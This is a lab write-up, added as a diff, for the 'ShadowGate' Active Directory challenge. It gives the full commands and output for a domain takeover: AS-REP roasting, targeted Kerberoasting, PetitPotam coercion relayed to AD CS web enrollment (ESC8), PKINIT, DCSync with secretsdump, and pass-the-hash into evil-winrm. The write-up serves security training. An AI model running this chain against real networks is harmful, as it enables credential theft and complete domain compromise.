@@ -1,0 +1,404 @@
+# ShadowGate
+
+**Platform:** Hack Smarter Labs  
+**Difficulty:** Medium  
+**Topics:** AS-REP Roasting, Targeted Kerberoasting, AD CS ESC8, NTLM Relay (PetitPotam), PKINIT, DCSync
+
+---
+
+## Overview
+
+ShadowGate simulates a post-acquisition internal penetration test against an Active Directory environment. The organisation recently absorbed a new network under tight operational deadlines, deferring security hardening. Starting with no credentials, the attack chain moves from unauthenticated enumeration through AS-REP roasting, BloodHound-guided targeted Kerberoasting, and full domain compromise by abusing AD CS ESC8 via authenticated NTLM relay.
+
+**Attack Path:**
+```
+Nmap → IIS + AD CS (/certsrv) detected
+→ SMB null session → 12 domain users enumerated
+→ ASREPRoast jtrueblood (no creds required)
+→ Hashcat (cracked) → Authenticated enumeration
+→ BloodHound → jtrueblood GenericWrite over bbrown
+→ Targeted Kerberoast bbrown → Hashcat (cracked)
+→ Certipy → ESC8: web enrollment over HTTP (no signing)
+→ ntlmrelayx + PetitPotam (authenticated coerce DC01$)
+→ DC01$ certificate issued → certipy auth (PKINIT) → DC01$ NT hash
+→ secretsdump DCSync → all domain hashes
+→ evil-winrm as Administrator → Root (krbtgt NT hash)
+```
+
+---
+
+## Target
+
+| Host | IP | Role |
+|------|-----|------|
+| `DC01.shadow.gate` | `<DC_IP>` | Windows Domain Controller / CA |
+
+---
+
+## Service Enumeration
+
+### Nmap
+
+```
+PORT      STATE SERVICE           VERSION
+53/tcp    open  domain            Simple DNS Plus
+80/tcp    open  http              Microsoft-IIS/10.0
+88/tcp    open  kerberos-sec      Microsoft Windows Kerberos
+139/tcp   open  netbios-ssn?
+389/tcp   open  tcpwrapped
+445/tcp   open  microsoft-ds?
+636/tcp   open  tcpwrapped
+3269/tcp  open  globalcatLDAPssl?
+3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: SHADOW
+|   NetBIOS_Domain_Name: SHADOW
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: shadow.gate
+|   DNS_Computer_Name: DC01.shadow.gate
+|   Product_Version: 10.0.20348
+
+SSL cert issuer: commonName=shadow-DC01-CA/domainComponent=shadow
+```
+
+Key findings:
+- **Domain:** `shadow.gate`
+- **Hostname:** `DC01.shadow.gate`
+- **OS:** Windows Server 2022 (Build 20348)
+- **Port 80:** IIS 10.0 — unusual for a DC, worth enumerating
+- **Port 3389:** RDP open externally
+- **SSL issuer:** `shadow-DC01-CA` — an internal Certificate Authority is present
+
+---
+
+## HTTP Enumeration (Port 80)
+
+### Dirsearch
+
+```
+301  /aspnet_client
+401  /certsrv/
+```
+
+Key finding: `/certsrv/` returns **401 Unauthorized** — AD Certificate Services (AD CS) web enrollment is deployed on the DC itself. The 401 means NTLM authentication is in use over HTTP (not HTTPS), which is the precondition for ESC8.
+
+---
+
+## SMB Enumeration
+
+### Null Session
+
+```bash
+nxc smb <DC_IP> -u "" -p ""
+```
+
+```
+[+] shadow.gate\:
+```
+
+Null session permitted. Share access denied, guest account disabled. RID brute-force blocked.
+
+### User Enumeration (Null Session)
+
+```bash
+nxc smb <DC_IP> -u "" -p "" --users
+```
+
+12 domain accounts enumerated:
+
+```
+Administrator
+Guest
+krbtgt
+ATHENA
+mbrownlee
+bbrown
+jtrueblood
+jsmith
+clocke
+tclarke
+jbradford
+amoss
+```
+
+---
+
+## Initial Access — AS-REP Roasting `jtrueblood`
+
+AS-REP roasting targets accounts with **"Do not require Kerberos pre-authentication"** set — no password needed, only a valid username list.
+
+```bash
+nxc ldap dc01.shadow.gate -u users.txt -p '' --asreproast hashes.txt
+```
+
+```
+LDAP  DC01  $krb5asrep$23$jtrueblood@SHADOW.GATE:caead45788330e72cd587bbe549cdd14$...
+```
+
+`jtrueblood` is AS-REP roastable. Crack offline:
+
+```bash
+hashcat hashes.txt /usr/share/wordlists/rockyou.txt
+```
+
+```
+$krb5asrep$23$jtrueblood@SHADOW.GATE:...:REDACTED
+```
+
+**Credentials: `jtrueblood:REDACTED`**
+
+### Verify
+
+```bash
+nxc smb dc01.shadow.gate -u jtrueblood -p 'REDACTED' --shares
+```
+
+```
+SMB  DC01  [+] SHADOW.GATE\jtrueblood:REDACTED
+SMB  DC01  ADMIN$      NO ACCESS
+SMB  DC01  C$          NO ACCESS
+SMB  DC01  CertEnroll  READ
+SMB  DC01  IPC$        READ
+SMB  DC01  NETLOGON    READ
+SMB  DC01  SYSVOL      READ
+```
+
+Notable: `CertEnroll` share is readable — confirms the CA.
+
+---
+
+## Authenticated Enumeration
+
+### BloodHound Collection
+
+```bash
+nxc ldap dc01.shadow.gate -u jtrueblood -p 'REDACTED' \
+  --bloodhound -c All --dns-server <DC_IP>
+```
+
+```
+Bloodhound data collection completed in 0M 30S
+```
+
+**Key finding — `jtrueblood` has `GenericWrite` over `bbrown`:**
+
+GenericWrite allows writing arbitrary attributes — most usefully, setting an SPN on the target account, enabling a **targeted Kerberoast** without requiring any special privilege.
+
+![BloodHound — jtrueblood GenericWrite over bbrown](screenshots/bloodhound-jtrueblood-genericwrite.png)
+
+---
+
+## Lateral Movement — Targeted Kerberoast `bbrown`
+
+With GenericWrite over `bbrown`, temporarily assign an SPN to make the account Kerberoastable, then request and crack the TGS ticket.
+
+**Tool:** [`targetedKerberoast`](https://github.com/ShutdownRepo/targetedKerberoast)
+
+```bash
+python3 ~/Tools/targetKerberoast/targetedKerberoast.py \
+  -u jtrueblood -p 'REDACTED' -d shadow.gate \
+  --dc-ip <DC_IP>
+```
+
+```
+$krb5tgs$23$*bbrown$SHADOW.GATE$shadow.gate/bbrown*$7ce933b9424f27a6cc71efc047215b97$...
+```
+
+```bash
+hashcat hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+```
+$krb5tgs$23$*bbrown$...:REDACTED
+```
+
+**Credentials: `bbrown:REDACTED`**
+
+### BloodHound — `bbrown` Membership
+
+`bbrown` is a member of **Certificate Service DCOM Access** — permitted to connect to Certification Authorities in the enterprise. This account has the entitlements to enumerate and interact with AD CS.
+
+---
+
+## AD CS Enumeration — Certipy
+
+```bash
+certipy find -u bbrown@shadow.gate -p 'REDACTED' -dc-ip <DC_IP>
+```
+
+```
+Certificate Authorities: 1
+  CA Name: shadow-DC01-CA
+  DNS Name: DC01.shadow.gate
+  Web Enrollment:
+    HTTP: Enabled
+    HTTPS: False
+  Vulnerabilities:
+    ESC8: Web Enrollment is enabled over HTTP
+```
+
+**ESC8 confirmed.** Web enrollment is enabled over plain HTTP with NTLM authentication. Because SMB signing is not enforced in this environment, we can:
+
+1. Coerce DC01$ into authenticating to our listener via MS-EFSRPC (PetitPotam)
+2. Relay that NTLM auth to `/certsrv/certfnsh.asp`
+3. Obtain a certificate for DC01$ (the machine account)
+4. Use the certificate with PKINIT to retrieve DC01$'s NT hash
+5. Use DC01$'s hash to DCSync the entire domain
+
+---
+
+## ESC8 Exploitation — NTLM Relay via PetitPotam
+
+### Step 1 — Start the Relay Listener
+
+```bash
+sudo impacket-ntlmrelayx \
+  -t http://<DC_IP>/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+```
+
+### Step 2 — Coerce DC01$ Authentication (Authenticated MS-EFSRPC)
+
+> Unauthenticated EfsRpcOpenFileRaw (MS08-025 patch) is blocked on this target — the authenticated path via `bbrown` is required.
+
+```bash
+python3 ~/Tools/PetitPotam/PetitPotam.py \
+  -u 'bbrown' -p 'REDACTED' -d shadow.gate \
+  <VPN_IP> <DC_IP>
+```
+
+```
+[+] Connected!
+[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
+[+] Successfully bound!
+[-] Sending EfsRpcOpenFileRaw!
+[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
+[+] OK! Using unpatched function!
+[-] Sending EfsRpcEncryptFileSrv!
+[+] Got expected ERROR_BAD_NETPATH exception!!
+[+] Attack worked!
+```
+
+The secondary EFS RPC function (`EfsRpcEncryptFileSrv`) is unpatched. Authentication coercion succeeded.
+
+### Step 3 — Certificate Issued
+
+Back in the relay listener:
+
+```
+[*] (SMB): Received connection from <DC_IP>, attacking target http://<DC_IP>
+[*] http:///@<DC_IP> [1] -> Generating CSR...
+[*] http:///@<DC_IP> [1] -> CSR generated!
+[*] http:///@<DC_IP> [1] -> Getting certificate...
+[*] http:///@<DC_IP> [1] -> GOT CERTIFICATE! ID 3
+[*] http:///@<DC_IP> [1] -> Writing PKCS#12 certificate to ./DC01.shadow.gate.pfx
+[*] http:///@<DC_IP> [1] -> Certificate successfully written to file
+```
+
+A certificate for `DC01.shadow.gate` (the machine account) is now in `./DC01.shadow.gate.pfx`.
+
+---
+
+## PKINIT — Obtaining DC01$ NT Hash
+
+Use the certificate to authenticate as DC01$ and retrieve its NT hash via PKINIT (Kerberos certificate authentication):
+
+```bash
+certipy auth -pfx DC01.shadow.gate.pfx -dc-ip <DC_IP>
+```
+
+```
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC01.shadow.gate'
+[*]     Security Extension SID: 'S-1-5-21-243493930-1113464705-3012771586-1000'
+[*] Using principal: 'dc01$@shadow.gate'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc01.ccache'
+[*] Trying to retrieve NT hash for 'dc01$'
+[*] Got hash for 'dc01$@shadow.gate': aad3b435b51404eeaad3b435b51404ee:<DC01_HASH>
+```
+
+**DC01$ machine account hash obtained.**
+
+---
+
+## Full Domain Compromise — DCSync
+
+With the DC machine account hash, perform a DCSync to extract all domain credentials. Domain Controllers have replication rights by design — DC01$ can pull any object including `krbtgt`.
+
+```bash
+secretsdump.py -just-dc-ntlm \
+  shadow.gate/'DC01$'@<DC_IP> \
+  -hashes 'aad3b435b51404eeaad3b435b51404ee:<DC01_HASH>'
+```
+
+```
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:<ADMIN_HASH>:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:<KRBTGT_HASH>:::
+shadow.gate\ATHENA:1103:...
+shadow.gate\mbrownlee:1104:...
+shadow.gate\bbrown:1109:...
+shadow.gate\jtrueblood:1110:...
+shadow.gate\jsmith:1112:...
+shadow.gate\clocke:1113:...
+shadow.gate\tclarke:1114:...
+shadow.gate\jbradford:1115:...
+shadow.gate\amoss:1116:...
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:<DC01_HASH>:::
+```
+
+All domain credentials dumped. Domain fully compromised.
+
+---
+
+## Admin Shell — Pass-the-Hash via evil-winrm
+
+```bash
+nxc winrm dc01.shadow.gate \
+  -u Administrator -H aad3b435b51404eeaad3b435b51404ee:<ADMIN_HASH>
+```
+
+```
+WINRM  DC01  [+] shadow.gate\Administrator:<ADMIN_HASH> (Pwn3d!)
+```
+
+```bash
+evil-winrm -i <DC_IP> -u Administrator \
+  -H aad3b435b51404eeaad3b435b51404ee:<ADMIN_HASH>
+```
+
+```
+Evil-WinRM shell v3.9
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+shadow\administrator
+```
+
+---
+
+## Root Flag
+
+This lab requires submission of the `krbtgt` NT hash rather than a file flag:
+
+```
+krbtgt NT hash: REDACTED
+```
+
+---
+
+## Summary
+
+| Step | Technique | Tool |
+|------|-----------|------|
+| Service enumeration | Nmap full scan — IIS + AD CS detected | `nmap` |
+| User enumeration | SMB null session RID cycling | `nxc` |
+| Initial access | AS-REP Roast → offline crack | `nxc`, `Hashcat` |
+| Domain enumeration | BloodHound ACL collection | `nxc`, `BloodHound` |
+| Lateral movement | GenericWrite → Targeted Kerberoast `bbrown` → crack | `targetedKerberoast`, `Hashcat` |
+| AD CS enumeration | ESC8 — web enrollment over HTTP | `Certipy` |
+| Authentication coercion | Authenticated MS-EFSRPC via `bbrown` | `PetitPotam` |
+| NTLM relay | Relay DC01$ auth → CA → DC01$ certificate | `impacket-ntlmrelayx` |
+| PKINIT | Certificate → DC01$ NT hash | `Certipy` |
+| Domain compromise | DCSync via DC01$ machine account | `secretsdump` |
+| Root | Pass-the-hash → Administrator WinRM/evil-winrm | `evil-winrm` |
